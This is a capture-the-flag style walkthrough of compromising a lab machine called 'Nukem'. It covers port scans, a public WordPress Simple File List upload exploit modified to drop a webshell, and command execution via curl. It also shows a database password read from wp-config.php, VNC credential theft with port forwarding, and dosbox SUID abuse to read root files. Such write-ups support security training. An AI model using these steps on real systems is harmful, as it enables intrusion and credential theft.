# Nukem

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.105
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 18:50 +08
Nmap scan report for 192.168.183.105
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
5000/tcp  open  upnp
13000/tcp open  unknown
36445/tcp open  unknown
```

RDP is open. Ran a detailed scan as well:

```
$ sudo nmap -p 80,5000,13000 -sC -sV --min-rate 3000 192.168.183.105
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 18:53 +08
Nmap scan report for 192.168.183.105
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-generator: WordPress 5.5.1
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
13000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
```

First thing I took note of was the outdated Wordpress site on port 80.

### Wordpress --> RCE

I ran a `wpscan` on the port 80 application.&#x20;

```
$ wpscan --api-token <API> --enumerate p,t,u --url http://192.168.183.105
```

There were loads of vulnerabilities, but the one that looked the easiest to exploit was the Simple File List RCE:

```
[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.183.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-06-08T11:52:00.000Z
 | [!] The version is out of date, the latest version is 6.1.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574
 |      - https://simplefilelist.com/
 |      - https://plugins.trac.wordpress.org/changeset/2286920/simple-file-list
 |      - https://packetstormsecurity.com/files/160221/
```

Unauthenticated = good in this case. `searchsploit` shows that there are 2 exploits publicly available:

```
$ searchsploit Wordpress Plugin simple file list
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
WordPress Plugin Simple File List 4.2.2 - Arbitrary File U | php/webapps/48979.py
WordPress Plugin Simple File List 4.2.2 - Remote Code Exec | php/webapps/48449.py
----------------------------------------------------------- ---------------------------------
```

I found that the first one worked better. Within the exploit, I also changed the payload to drop a webshell instead:

<figure><img src="../../../.gitbook/assets/image (2922).png" alt=""><figcaption></figcaption></figure>

We can then run the exploit and confirm that it works:

```
$ python3 48979.py http://192.168.183.105
[ ] File 4345.png generated with password: 7a1538697392c42d7dbfb559c6fb67aa
[ ] File uploaded at http://192.168.183.105/wp-content/uploads/simple-file-list/4345.png
[ ] File moved to http://192.168.183.105/wp-content/uploads/simple-file-list/4345.php
[+] Exploit seem to work.
[*] Confirmning ...

$ curl http://192.168.183.105/wp-content/uploads/simple-file-list/4345.php?cmd=id
uid=33(http) gid=33(http) groups=33(http)
```

Tested loads of ports, and only reverse shells to port 80 work:

<figure><img src="../../../.gitbook/assets/image (1595).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Commander Creds

The `/srv/html/wp-config.php` file contained some creds for the user `commander`:

```php
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
```

<figure><img src="../../../.gitbook/assets/image (2467).png" alt=""><figcaption></figcaption></figure>

### VNC + Dosbox SUID

I checked the SUID binaries available and found `dosbox` was one of them.

```
[commander@nukem ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/dosbox
```

`dosbox` SUID privilege escalation exploits require a GUI to work, and conveniently, VNC on port 5901 is available on the machine:

```
[commander@nukem ~]$ netstat -tulpn 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      401/Xvnc            
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:36445           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:13000           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::36445                :::*                    LISTEN      - 
```

Also, within the user's directory, there's a `.vnc` file which presumably contains credentials we need:

```
[commander@nukem ~]$ ls -la .vnc
total 20
drwxr-xr-x  2 commander root      4096 Sep 18  2020 .
drwxr-xr-x 11 commander commander 4096 Jul 12 11:03 ..
-rw-r--r--  1 commander root        54 Sep 18  2020 config
-rw-r--r--  1 commander commander 3479 Feb 17 19:27 nukem:1.log
-rw-------  1 commander commander    8 Sep 18  2020 passwd
```

We can transfer the small `passwd` file over to our machine via `base64` encoding. Then, we can port forward VNC via `chisel`. Using `vncviewer`, we can connect to it:

```
$ vncviewer -passwd passwd 127.0.0.1:5901
```

<figure><img src="../../../.gitbook/assets/image (2925).png" alt=""><figcaption></figcaption></figure>

Within the terminal we can run this:

```
dosbox -c 'mount c /' -c "type c:$LFILE"
```

This would spawn a `dosbox` instance (which is basically a cmd.exe instance). Using the `C:` command, we can view the `root` flag:

<figure><img src="../../../.gitbook/assets/image (2937).png" alt=""><figcaption></figcaption></figure>

There's no scrolling on this Dosbox instance, and the handling of control characters is a little inaccurate (so you can't really backspace). Other than that, we have `root` access over the file system and can do whatever we want.&#x20;

Rooted!
